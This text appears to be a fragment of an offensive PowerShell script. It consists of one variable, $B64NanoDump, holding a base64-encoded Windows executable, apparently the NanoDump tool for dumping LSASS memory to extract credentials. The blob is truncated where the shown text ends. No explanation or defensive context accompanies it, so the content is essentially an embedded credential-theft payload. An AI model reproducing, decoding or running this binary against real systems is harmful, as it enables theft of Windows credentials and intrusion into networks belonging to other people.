    $B64NanoDump = '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SIlFwEiLRcBIiUX4SItF+EgFGAEAAEiJRfBIi0X4SAUcAQAASIlF6EiLRfhIBSABAABIiUXgSItF+EgFJAEAAEiJRdhIi0X4SAXoAgAASIlF0GbHRZAJAGbHRZIAAGbHRZQAAMZFlgDGRZcBSItF8IsAiUWYSItF6IsAiUWcSItF4A+3AA+3wIlFoEiLRdiLAIlFpMdFqAAAAABmx0WsAABmx0WuAABIx0WwAAAAAEjHRbgAAAAAx0WMMAAAAMdFzAAAAACLRcxImEiNlVD///9IAcIPt0WQZokCg0XMAotFzEiYSI2VUP///0gBwg+3RZJmiQKDRcwCi0XMSJhIjZVQ////SAHCD7dFlGaJAoNFzAKLRcxImEiNlVD///9IAcIPtkWWiAKDRcwBi0XMSJhIjZVQ////SAHCD7ZFl4gCg0XMAYtFzEiYSI2VUP///0gBwotFmIkCg0XMBItFzEiYSI2VUP///0gBwotFnIkCg0XMBItFzEiYSI2VUP///0gBwotFoIkCg0XMBItFzEiYSI2VUP///0gBwotFpIkCg0XMBItFzEiYSI2VUP///0gBwotFqIkCg0XMBItFzEiYSI2VUP///0gBwg+3RaxmiQKDRcwCi0XMSJhIjZVQ////SAHCD7dFrmaJAoNFzAKLRcxImEiNlVD///9IAcJIi0WwSIkCg0XMCItFzEiYSI2VUP///0gBwkiLRbhIiQKDRcwISItFEItAEImFTP///4tVjEiNhVD///9BidBIicJIi00Q6IT1//9IjUWMQbkEAAAASYnAuiQAAABIi00Q6CD1//9IjYVM////QbkEAAAASYnAuigAAABIi00Q6AL1//9Ii0UQi0AQiYVI////SItF0A+3AA+3wImFRP///0iNhUT///9BuAQAAABIicJIi00Q6BX1//9Ii0XQD7cAD7fQSItF0EiLQAhBidBIicJIi00Q6PT0//+LhUz///+DwBhIjZVI////QbkEAAAASYnQicJIi00Q6If0//+4AQAAAEiBxOAAAABdw1VIieVIg+xwSIlNEMdF/AAAAABIjVXAi0X8SMdEJCAAAAAAQbkwAAAASYnQicJIi00Q6Ejs//+JRfiDffgAeRuLRfiJwkiNBVenAABIicHor+r//7gAAAAA6wRIi0XISIPEcF3DVUiB7AADAABIjawkgAAAAEiJjZACAABIiZWYAgAARImFoAIAAESJjagCAABIx4V4AgAAAAAAAMeFdAIAAAAAAABIi42QAgAA6E7///9IiYVYAgAASIO9WAIAAAB1CrgAAAAA6dkEAABmx4VWAgAACABIi4VYAgAASIPAGEiJhUgCAABID7+NVgIAAEiNlRgCAABIi4VIAgAASMdEJCAAAAAASYnJSYnQSInCSIuNkAIAAOjH6v//iYVEAgAAgb1EAgAADQAAgHUTg72oAgAAAHUKuAAAAADpZQQAAIO9RAIAAAB5IYuFRAIAAInCSI0FiqYAAEiJweii6f//uAAAAADpOwQAAEiLhRgCAABIg8AgSImFOAIAAEgPv41WAgAASI2VEAIAAEiLhTgCAABIx0QkIAAAAABJiclJidBIicJIi42QAgAA6DLq//+JhUQCAACDvUQCAAAAeSGLhUQCAACJwkiNBRSmAABIicHoLOn//7gAAAAA6cUDAABIi4UQAgAASImFMAIAAGbHhXICAAAAAOlkAwAASIuFEAIAAEiNlbABAABIx0QkIAAAAABBuVgAAABJidBIicJIi42QAgAA6Lfp//+JhUQCAACDvUQCAAAAeSGLhUQCAACJwkiNBZmlAABIicHosej//7gAAAAA6UoDAADHhWwCAAAAAAAAx4VoAgAAAAAAAOm8AgAAi4VoAgAASJhIjRTFAAAAAEiLhZgCAABIAdBIiwC6/wAAAEiJwehEJgAAZomFLgIAAA+/hS4CAACNFAAPt4X4AQAAD7fAOcIPhWcCAACDvWwCAAAAD4WEAAAASI1FsEG4AAIAALoAAAAASInB6C10AAAPt4X4AQAAD7fISIuFAAIAAEiNVbBIx0QkIAAAAABJiclJidBIicJIi42QAgAA6Mro//+JhUQCAACDvUQCAAAAeSGLhUQCAACJwkiNBaykAABIicHoxOf//7gAAAAA6V0CAADHhWwCAAABAAAAi4VoAgAASJhIjRTFAAAAAEiLhZgCAABIAdBIiwBIjVWwSInBSIsFPQUBAP/QhcAPhaIBAACLhWgCAABImEiNFMUAAAAASIuFmAIAAEgB0EiLAEiNFWukAABIicFIiwUFBQEA/9CFwHUKx4V0AgAAAQAAAEiLBc4DAQD/0EG4GAEAALoIAAAASInBSIsFxwMBAP/QSImFIAIAAEiDvSACAAAAdSpIiwWFAwEA/9BBicC6GAEAAEiNBYyhAABIicHo7Ob//7gAAAAA6YUBAABIi4UgAgAASMcAAAAAAEiLldABAABIi4UgAgAASIlQCIuV4AEAAEiLhSACAACJUBAPt4XoAQAAD7fQSIuFIAIAAEiNSBRIi4XwAQAASMdEJCAAAAAASYnRSYnISInCSIuNkAIAAOhY5///iYVEAgAAg71EAgAAAHkhi4VEAgAAicJIjQU6owAASInB6FLm//+4AAAAAOnrAAAASIO9eAIAAAB1EEiLhSACAABIiYV4AgAA60FIi4V4AgAASImFYAIAAOsRSIuFYAIAAEiLAEiJhWACAABIi4VgAgAASIsASIXAdeBIi4VgAgAASIuVIAIAAEiJEA+3hXICAACDwAFmiYVyAgAA6wGQg4VoAgAAAYuFaAIAADuFoAIAAA+MMv3//0iLhbABAABIiYUQAgAASIuFEAIAAEg5hTACAAB0FQ+/hXICAAA5haACAAAPj4n8///rAZCDvagCAAAAdB+DvXQCAAAAdRZIjQWjogAASInB6Gvl//+4AAAAAOsHSIuFeAIAAEiBxAADAABdw1VIgezQAQAASI2sJIAAAABIiY1gAQAASI0FSqIAAEiJhaAAAABIjQV+ogAASImFqAAAAEiNBYaiAABIiYWwAAAASI0FjKIAAEiJhbgAAABIjQWWogAASImFwAAAAEiNBaKiAABIiYXIAAAASI0FrKIAAEiJhdAAAABIjQW4ogAASImF2AAAAEiNBcCiAABIiYXgAAAASI0FzKIAAEiJhegAAABIjQXSogAASImF8AAAAEiNBdqiAABIiYX4AAAASI0F4qIAAEiJhQABAABIjQXqogAASImFCAEAAEiNBfqiAABIiYUQAQAASI0FBqMAAEiJhRgBAABIjQUQowAASImFIAEAAEiNBRqjAABIiYUoAQAASIuFYAEAAEiLAEiNlaAAAABBuQEAAABBuBIAAABIicHofvn//0iJhUABAABIg71AAQAAAHUKuAAAAADp5QQAAEiLhUABAABIiYVIAQAAx4WcAAAAAAAAAOmcAAAAi4WcAAAAg8ABiYWcAAAASIuFYAEAAItQEEiLhUgBAACJkBQBAABIi4VIAQAASIPAFLoAAQAASInB6IYhAACJRRiLRRiDwAGJRRiLRRgBwIlFGEiNRRhBuAQAAABIicJI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